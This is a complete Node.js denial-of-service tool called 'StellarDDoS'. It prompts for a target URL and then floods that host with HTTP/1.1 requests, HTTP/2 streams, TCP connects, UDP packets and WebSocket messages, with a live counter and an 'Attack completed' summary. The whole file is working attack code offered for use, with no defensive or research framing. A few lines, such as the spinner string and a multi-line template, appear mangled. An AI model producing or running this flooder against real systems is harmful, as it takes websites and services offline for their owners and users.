#!/usr/bin/env node 'use strict';

const net = require('net'); const dgram = require('dgram'); const http = require('http'); const https = require('https'); const http2 = require('http2'); const WebSocket = require('ws'); const { performance } = require('perf_hooks'); const readline = require('readline'); const chalk = require('chalk');

class StellarDDoS { constructor() { this.stats = { total: 0, success: 0, failed: 0, startTime: 0 }; this.running = false; this.anim = ['|', '/', '-', '\']; this.animIdx = 0; }

startAttack(target, options = {}) {
    if (this.running) return;
    const threads = options.threads || 200;
    const duration = options.duration || 30;
    const url = new URL(target);
    const protocol = target.startsWith('https') ? https : http;

    this.running = true;
    this.stats.startTime = performance.now();

    this.agent = new protocol.Agent({ keepAlive: true, maxSockets: threads * 500 });

    this.udpSocket = dgram.createSocket('udp4').on('error', () => {});

    this.showInt = setInterval(() => this.showStats(), 10);
    this.animInt = setInterval(() => this.animIdx = (this.animIdx + 1) % this.anim.length, 10);

    for (let i = 0; i < threads * 100; i++) this.http1(url, protocol);
    for (let i = 0; i < threads * 50; i++) this.http2flood(url);
    for (let i = 0; i < threads * 100; i++) this.tcpFlood(url);
    for (let i = 0; i < threads * 50; i++) this.udpFlood(url);
    for (let i = 0; i < threads * 50; i++) this.wsFlood(url);

    setTimeout(() => this.stop(), duration * 1000);
}

http1(url, protocol) {
    if (!this.running) return;
    const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + '?' + Math.random().toString(36).slice(2),
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0', Connection: 'keep-alive' },
        agent: this.agent
    };
    const req = protocol.request(options, res => {
        res.on('data', () => {});
        res.on('end', () => this.onSuccess());
    });
    req.on('error', () => this.onFail());
    for (let j = 0; j < 100; j++) {
        req.write(
            `GET ${url.pathname}?${Math.random().toString(36).slice(2)} HTTP/1.1\r

Host: ${url.hostname}\r Connection: keep-alive\r \r ` ); } req.setTimeout(1000, () => req.destroy()); req.end(); }

http2flood(url) {
    if (!this.running) return;
    const client = http2.connect(url.origin);
    client.on('error', () => client.close());
    for (let i = 0; i < 50; i++) {
        const req = client.request({ ':path': url.pathname + '?' + Math.random().toString(36).slice(2), ':method': 'GET' });
        req.on('data', () => {});
        req.on('end', () => { this.onSuccess(); req.close(); });
        req.end();
    }
    setTimeout(() => client.close(), 2000);
}

tcpFlood(url) {
    if (!this.running) return;
    const sock = net.connect({ host: url.hostname, port: url.port || 80 }, () => {
        this.onSuccess();
        sock.destroy();
        if (this.running) this.tcpFlood(url);
    });
    sock.on('error', () => { this.onFail(); if (this.running) this.tcpFlood(url); });
}

udpFlood(url) {
    if (!this.running) return;
    const msg = Buffer.alloc(2048);
    this.udpSocket.send(msg, url.port || 80, url.hostname, err => {
        err ? this.onFail() : this.onSuccess();
        if (this.running) this.udpFlood(url);
    });
}

wsFlood(url) {
    if (!this.running) return;
    const wsUrl = url.origin.replace(/^http/, 'ws');
    const ws = new WebSocket(wsUrl);
    ws.on('open', () => {
        const msg = 'x'.repeat(1024);
        const flood = () => {
            if (!this.running) return ws.close();
            ws.send(msg, err => err ? this.onFail() : this.onSuccess());
            setImmediate(flood);
        };
        flood();
    });
    ws.on('error', () => this.onFail());
}

onSuccess() { this.stats.success++; this.stats.total++; process.stdout.write(chalk.green('.')); }
onFail()    { this.stats.failed++; this.stats.total++; process.stdout.write(chalk.red('x')); }

showStats() {
    const e = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    process.stdout.write(`\r${chalk.greenBright(this.anim[this.animIdx])} ${e}s | R:${this.stats.total} | ` +
                         `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`);
}

stop() {
    if (!this.running) return;
    clearInterval(this.showInt);
    clearInterval(this.animInt);
    this.udpSocket.close();
    const e = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    console.log(chalk.green(`\nAttack completed in ${e}s`));
    console.log(chalk.blue(`Total: ${this.stats.total}`));
    console.log(chalk.green(`${this.stats.success} success`) + ' | ' + chalk.red(`${this.stats.failed} failed`));
    process.exit(0);
}

}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const stellar = new StellarDDoS(); rl.question(chalk.greenBright('Target URL: '), target => { rl.question(chalk.greenBright('Threads (200): '), threads => { rl.question(chalk.greenBright('Duration (30s): '), duration => { stellar.startAttack(target, { threads: parseInt(threads) || 200, duration: parseInt(duration) || 30 }); rl.on('line', line => { if (line.trim() === 'stop') { stellar.stop(); rl.close(); } }); }); }); }); rl.on('close', () => stellar.stop());

